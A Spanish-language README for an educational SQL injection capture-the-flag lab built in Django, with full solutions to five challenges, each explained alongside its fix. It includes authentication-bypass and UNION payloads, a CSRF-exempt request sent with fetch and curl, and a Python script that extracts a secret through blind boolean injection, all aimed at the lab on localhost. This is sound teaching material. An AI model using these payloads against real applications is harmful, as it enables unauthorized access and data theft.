# Rompiendo el candado: CTF de SQL Injection — AIEP

Laboratorio práctico de **inyección SQL** creado para la charla *"Rompiendo
el candado: de la explotación al parche"* (AIEP, Ingeniería en
Ciberseguridad / Ingeniería en Informática). Es una aplicación Django
real — no una simulación — con **5 retos de dificultad creciente**, cada
uno con un interruptor para pasar de la versión **vulnerable** a la
versión **corregida**, para que puedas ver el mismo bug desde los dos
lados: el del atacante y el del desarrollador.

> **Uso exclusivamente educativo.** Resuelve los retos solo contra el
> laboratorio de este repositorio. Explotar una vulnerabilidad similar
> contra un sistema real sin autorización explícita es delito informático
> en la mayoría de los países (en Chile, Ley 21.459). Más contexto legal
> en [preguntas-frecuentes.md](SQLInjection/preguntas-frecuentes.md).

## Contenido del repositorio

| Carpeta / archivo | Qué encontrarás |
|---|---|
| [`lab/`](lab/README.md) | La aplicación Django del CTF ("Intranet Ficticia"): código vulnerable y corregido, listo para instalar y correr en tu equipo. |
| [`SQLInjection/`](SQLInjection/CharlaCiberseguridad.md) | Material de estudio: guía de resolución paso a paso por reto, manual de estudio de SQLi, FAQ, ejercicios y guía para desplegar tu propia copia pública. |
| Este archivo | Punto de entrada: instalación rápida, solución completa de los 5 retos y datos interesantes. |

## Instalación rápida

Requiere Python 3.11+ instalado.

```powershell
cd lab
python -m venv .venv
.\.venv\Scripts\pip.exe install -r requirements.txt
.\.venv\Scripts\python.exe manage.py migrate
.\.venv\Scripts\python.exe manage.py seed_lab
```

`seed_lab` crea dos usuarios de demo (podés correrlo de nuevo cuando
quieras, es idempotente):

| usuario | password | rol |
|---|---|---|
| `admin` | `admin2026` | superuser — el objetivo del bypass de los retos 1 y 2 |
| `juan.perez` | `juan2026` | usuario normal — para probar que el login legítimo sigue funcionando |

Levantar el servidor en **modo vulnerable** (para resolver los retos):

```powershell
$env:LAB_MODE = "vulnerable"
.\.venv\Scripts\python.exe manage.py runserver 127.0.0.1:8000
```

Abre **http://127.0.0.1:8000/retos/** — el hub con los 5 retos. Para ver
la versión corregida, detén el servidor (`Ctrl+C`) y repite con
`$env:LAB_MODE = "secure"` (no se puede cambiar en caliente).

Detalle completo de instalación y estructura del proyecto en
[lab/README.md](lab/README.md).

## Los 5 retos

| # | Reto | Dificultad | URL | Objetivo |
|---|------|:---:|---|---|
| 1 | Bypass de autenticación | Fácil | `/login/` | Entrar como `admin` sin conocer su clave |
| 2 | Extracción con UNION | Medio | `/login/` | Obtener el *hash* de la contraseña de `admin` |
| 3 | Transferencia sin CSRF | Medio | `/reto3/` | Ejecutar una acción autenticada sin token CSRF |
| 4 | Buscador vulnerable | Medio | `/buscar/` | Extraer un documento confidencial vía `UNION` a ciegas de columnas |
| 5 | Blind boolean-based SQLi | Avanzado | `/verificar/` | Extraer un secreto carácter por carácter, sin errores ni datos visibles |

Cada reto tiene también su propia guía extendida con capturas
esperadas, errores comunes y la sección "en modo corregido":
[Reto 1](SQLInjection/guia-reto1-bypass-login.md) ·
[Reto 2](SQLInjection/guia-reto2-union-hash.md) ·
[Reto 3](SQLInjection/guia-reto3-csrf.md) ·
[Reto 4](SQLInjection/guia-reto4-buscador-union.md) ·
[Reto 5](SQLInjection/guia-reto5-blind-boolean.md).

---

## Solución — Reto 1: Bypass de autenticación

**Antes de intentarlo:** prueba con `usuario=x`, `contraseña=x` — verás
"⛔ Credenciales inválidas" (401). Esa es la línea base.

**Paso 1 — confirmar la inyección.** En el campo usuario escribe una
comilla simple: `admin'`. La página responde con un error de base de
datos (500) en vez del error normal de credenciales — señal de que el
input se está interpretando como código SQL.

**Paso 2 — el bypass.** En el campo usuario escribe (con el espacio
final):

```
admin' -- 
```

Contraseña: cualquier cosa. Vas a entrar como `admin` y ver la flag.

**Por qué funciona:** la vista arma la consulta así:

```python
query = f"""
    SELECT id, username FROM auth_user
    WHERE username = '{username}' AND password = '{password}'
"""
```

Con el payload, la consulta real queda:

```sql
SELECT id, username FROM auth_user WHERE username = 'admin' -- ' AND password = 'x'
```

`--` es un comentario SQL: todo lo que sigue en la línea deja de
ejecutarse. La base de datos recibe, en la práctica, `WHERE username =
'admin'` — sin condición de contraseña. Como `admin` existe, hay match y
la app concluye que el login fue exitoso. Esto se llama *comment
injection* / *authentication bypass vía SQLi*: no se "adivina" la clave,
se modifica la pregunta que la app le hace a la base de datos.

**La corrección:** en modo `secure`, la vista usa
`authenticate()`/`login()` de Django, que nunca concatena el input en un
string SQL — usa el ORM con consultas parametrizadas y compara contra el
*hash* de la contraseña, nunca contra texto plano. El mismo payload, en
modo `secure`, simplemente falla con "Credenciales inválidas".

## Solución — Reto 2: Extracción con UNION

Mismo formulario (`/login/`). En el campo usuario:

```
' UNION SELECT id, password FROM auth_user -- 
```

En el lugar donde normalmente aparece el nombre de usuario, aparece el
**hash** de la contraseña de `admin` (`pbkdf2_sha256$...`).

**Por qué funciona:** `UNION SELECT` combina dos consultas `SELECT`
siempre que tengan el mismo número de columnas. La consulta original pide
2 columnas (`id, username`); la del ataque también pide 2 (`id,
password`), pero "disfrazadas" en el mismo formato — la vista las muestra
sin saber que en realidad son contraseñas.

Se obtiene un *hash* y no la clave en texto plano porque Django siempre
hashea las contraseñas (PBKDF2 por defecto) — es la situación real de una
filtración de base de datos: rara vez se obtiene la clave directamente,
se obtiene el hash, y aun así hay que intentar crackearlo offline.

**La corrección:** misma función que el Reto 1 — `authenticate()` hace
que el `UNION SELECT` deje de tener efecto, porque el input solo se
acepta como valor literal, nunca como código SQL.

## Solución — Reto 3: Transferencia sin protección CSRF

En `/reto3/`, un botón "Ejecutar transferencia" dispara:

```javascript
fetch("/transferir/", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "monto=999999&destino=cuenta-del-atacante"
}).then(r => r.json()).then(console.log)
```

Y responde con la flag — sin pedir ningún token CSRF. Podés reproducirlo
desde la consola del navegador (F12) en **cualquier pestaña**, o incluso
sin navegador:

```powershell
curl -X POST "http://127.0.0.1:8000/transferir/" `
  --data-urlencode "monto=9999" `
  --data-urlencode "destino=cuenta-atacante"
```

**Por qué funciona:** la vista está decorada con `@csrf_exempt`, que le
dice a Django que no exija el token CSRF habitual en ese endpoint. Es el
escenario clásico de CSRF: si la víctima tiene una sesión abierta,
**cualquier otra pestaña o sitio** puede disparar la misma petición en su
nombre.

**La corrección:** quitar `@csrf_exempt` y dejar que la protección CSRF
nativa de Django (activa por defecto) haga su trabajo — en modo `secure`
el endpoint responde `403 Forbidden`.

## Solución — Reto 4: Buscador vulnerable (UNION a ciegas de columnas)

En `/buscar/`, a diferencia del Reto 2, la página no dice cuántas
columnas tiene la consulta — hay que descubrirlo.

**Paso 1:** busca algo normal (`Ana`) para ver la tabla de resultados (2
columnas: nombre, cargo).

**Paso 2:** confirma la inyección con una comilla simple (`'`) → error de
sintaxis.

**Paso 3 — contar columnas con `ORDER BY`:**

```
algo' ORDER BY 1-- 
algo' ORDER BY 2-- 
algo' ORDER BY 3-- 
```

El número anterior al que falla es la cantidad real de columnas (en este
laboratorio: 2).

**Paso 4 — construir el UNION:**

```
algo' UNION SELECT titulo, contenido FROM documentos_confidenciales -- 
```

Aparece un documento confidencial que nada tiene que ver con el buscador
de empleados — con la flag dentro.

**Por qué funciona:** mismo principio del Reto 2 (columnas iguales entre
ambas consultas), pero esta vez dentro de un `LIKE '%...%'` — demuestra
que la vulnerabilidad no vive solo en el login.

**La corrección:** el ORM (`Empleado.objects.filter(nombre__icontains=q)`)
nunca concatena el input en SQL.

## Solución — Reto 5: Blind boolean-based SQLi

En `/verificar/` no hay errores visibles ni datos en pantalla — solo
"Disponible" / "No disponible". Esa diferencia es la única señal.

**Paso 1 — confirmar la inyección:**

```
x' OR '1'='1
```

Responde "No disponible" (condición verdadera para cualquier fila).
Contraprueba con `x' AND '1'='2` → "Disponible" (condición falsa).

**Paso 2 — convertir la condición en una pregunta real:**

```
x' OR (SELECT substr(valor,1,1) FROM secretos)='A' -- 
```

Se reconstruye el valor de la tabla `secretos` carácter por carácter,
probando cada posición.

**Paso 3 — automatizar la extracción:**

```python
import requests

BASE = "http://127.0.0.1:8000/verificar/"
CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"

flag = ""
for pos in range(1, 60):
    for c in CHARS:
        payload = f"x' OR (SELECT substr(valor,{pos},1) FROM secretos)='{c}' -- "
        r = requests.get(BASE, params={"usuario": payload})
        if "No disponible" in r.text:
            flag += c
            print(flag)
            break
    else:
        break

print("FLAG:", flag)
```

**Para ir más allá:** [sqlmap](https://sqlmap.org/) automatiza esta
misma técnica (y los otros tipos del laboratorio) sin escribir nada a
mano — apunta a `/verificar/?usuario=x` con `-u` y `-p usuario`.

**La corrección:** `User.objects.filter(username=usuario).exists()` del
ORM — ninguna variante de `OR`/`AND` cambia el comportamiento de la
consulta.

---

## Datos interesantes

- **Existen 4 categorías de SQL Injection.** *In-band* (el ataque y el
  resultado se ven en la misma respuesta, como en los Retos 2 y 4),
  *blind/inferencial* (solo se observa un comportamiento distinto, como
  en el Reto 5), *error-based* (mensajes de error revelan estructura
  interna, como en el Reto 1) y *out-of-band* — la más rara: el atacante
  fuerza al motor a filtrar datos por un canal completamente distinto al
  de entrada, típicamente forzando una consulta DNS hacia un servidor
  propio (`UTL_HTTP` en Oracle, `xp_dirtree` en SQL Server son ejemplos
  históricos).
- **`UNION SELECT` tiene una restricción matemática simple pero
  poderosa:** ambas consultas deben devolver el mismo número exacto de
  columnas. Por eso el Reto 4 obliga a "tantear" con `ORDER BY` antes de
  poder extraer nada — es, en esencia, una búsqueda binaria manual sobre
  el número de columnas.
- **El hash del Reto 2 empieza con `pbkdf2_sha256$870000$...`** — ese
  870.000 es el número de iteraciones que Django aplica por defecto al
  hashear una contraseña. Existe para hacer computacionalmente costoso
  probar contraseñas por fuerza bruta contra un hash filtrado; es la
  razón por la que "obtener el hash" en una filtración real casi nunca es
  sinónimo de "obtener la contraseña" de inmediato.
- **Hay buscadores dedicados a encontrar servidores mal configurados en
  internet.** [Shodan](https://www.shodan.io/) puede localizar servidores
  con `DEBUG=True` de Django activo en producción — exactamente el error
  que la [guía de despliegue en Railway](SQLInjection/guia-despliegue-railway.md)
  de este proyecto evita al forzar `DEBUG=False`, para que un error SQL
  se vea como un mensaje controlado y no como la página de depuración
  completa de Django (con `SECRET_KEY` y rutas del servidor incluidas).
- **OWASP tiene un Top 10 específico para aplicaciones con LLM**, y la
  categoría **LLM01** es *Prompt Injection* — el mismo problema de fondo
  que SQL Injection (datos no confiables que terminan actuando como
  instrucciones), aplicado al lenguaje natural que recibe un modelo en
  vez de a SQL. La defensa es análoga: nunca dejar que el modelo ejecute
  operaciones libremente, sino traducir su intención a funciones
  predefinidas con permisos acotados (*function calling* / *tool use*).
- **El bypass del Reto 1 (`admin' -- `) usa una técnica documentada en
  incidentes reales desde los años 2000** — el payload en sí casi no ha
  cambiado en dos décadas; lo que cambió fue la adopción de ORMs y
  consultas parametrizadas como estándar de la industria.
- **En Chile, explotar esto sin autorización es delito informático**
  (Ley 21.459, vigente desde 2022) — por eso todo el contenido de este
  repositorio se practica exclusivamente contra el laboratorio propio.

Para una inmersión mucho más profunda en los fundamentos (parametrización,
threat modeling, defensa en profundidad, Zero Trust, SQLi en la era de la
IA, glosario y preguntas de autoevaluación), ver el
[Manual de estudio de SQL Injection](SQLInjection/manual-de-estudio.md).

## Créditos

Laboratorio y material preparados por **Jonathan Zenteno G.** para AIEP.
